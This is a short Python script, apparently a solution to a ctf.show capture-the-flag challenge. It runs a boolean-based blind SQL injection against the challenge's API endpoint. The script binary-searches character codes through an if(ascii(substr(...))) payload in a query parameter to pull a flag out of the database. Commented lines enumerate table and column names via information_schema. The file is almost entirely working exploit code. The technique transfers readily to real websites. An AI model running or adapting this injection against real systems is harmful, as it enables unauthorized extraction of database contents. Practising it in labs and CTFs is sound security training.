import requests

url = 'http://46379f6e-0d68-42ba-8b5f-00aee565063b.challenge.ctf.show/api/'
flag = ''
i = 0

while True:
    start = 32
    tail = 127
    i += 1

    while start < tail:
        mid = (start + tail) >> 1
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"
        payload = 'select concat(flagaabc) from ctfshow_flaga'
        data = {'u': f"if(ascii(substr(({payload}),{i},1))>{mid},username,'a')"}
        res = requests.get(url, params=data)
        if "userAUTO" in res.text:
            start = mid + 1
        else:
            tail = mid
    if start != 32:
        flag += chr(start)
    else:
        break
    print(flag)
